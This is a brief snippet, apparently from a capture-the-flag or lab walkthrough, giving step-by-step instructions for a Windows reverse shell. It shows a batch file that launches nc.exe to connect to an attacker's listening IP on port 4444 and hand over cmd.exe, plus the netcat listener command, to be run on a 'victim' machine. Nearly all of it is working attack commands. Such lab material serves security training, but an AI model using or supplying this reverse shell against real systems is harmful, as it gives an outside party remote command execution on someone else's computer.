File must be a `.bat` file (batch file). Create using notepad and change file extension to `.bat`

```
@echo off
C:\Users\McSkidy\Downloads\nc.exe LISTENING_IP 4444 -e cmd.exe
```

Listen on port 4444 and run the `.bat` file on the victim Windows machine.

```
nc -nlvp 4444
```
